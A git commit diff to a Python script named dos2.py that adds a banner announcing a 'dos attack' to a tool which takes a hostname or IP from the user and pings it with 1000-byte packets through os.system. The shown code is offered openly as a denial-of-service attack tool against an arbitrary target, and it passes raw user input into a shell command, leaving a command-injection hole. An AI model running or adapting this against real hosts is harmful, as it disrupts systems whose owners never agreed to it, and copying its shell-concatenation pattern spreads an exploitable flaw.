b7471d3da378579c3522bc450529ed125400a818
hack4peace <90603785+official-hack4peace@users.noreply.github.com>
2022-01-17 18:09:38 +0530

    Update dos2.py

--- dos2.py
+++ dos2.py
@@ -1,5 +1,12 @@
+print ("               __ ")
+print ("    .,-;-;-,. /'_\    ______________________")
+print ("  _/_/_/_|_\_\) /   <|Let's start dos attack|")
+print ("'-<_><_><_><_>=/\     ----------------------")
+print (" `/_/====/_/-'\_\ ")
+print ("  ''     ''    '' ")
 import os
 user = input ("Enter hostname or ip: ")
+print ("DOS ATTACK STARTED!")
 def myping(host):
     response = os.system("ping -s 1000 " + host)
     
